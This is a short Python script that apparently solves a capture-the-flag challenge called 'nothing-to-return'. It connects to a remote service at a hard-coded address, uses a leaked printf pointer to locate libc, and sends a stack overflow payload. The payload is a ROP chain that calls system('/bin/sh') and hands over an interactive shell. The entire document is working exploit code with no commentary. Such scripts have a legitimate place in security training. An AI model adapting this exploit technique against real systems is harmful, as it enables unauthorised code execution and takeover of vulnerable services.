from ptrlib import *

chall = "./nothing-to-return"
libc = "./libc.so.6"

elf = ELF(chall)
libc = ELF(libc)

#sock = Process(chall)
sock = Socket("nc 34.30.126.104 5000")

printf_leak = sock.recvuntil("\n")
printf_addr = int(printf_leak.replace(b"printf is at ", b"").replace(b"\n", b""), 16)

libc.base = printf_addr - libc.symbol("printf")

sock.recvuntil("Input size:\n")
sock.sendline(b"1024")
sock.recvuntil("Enter your input:\n")

payload = b"A" * 72
payload += p64(next(libc.gadget("ret;")))
payload += p64(next(libc.gadget("pop rdi; ret;")))
payload += p64(next(libc.search("/bin/sh")))
payload += p64(libc.symbol("system"))

sock.sendline(payload)
sock.sh()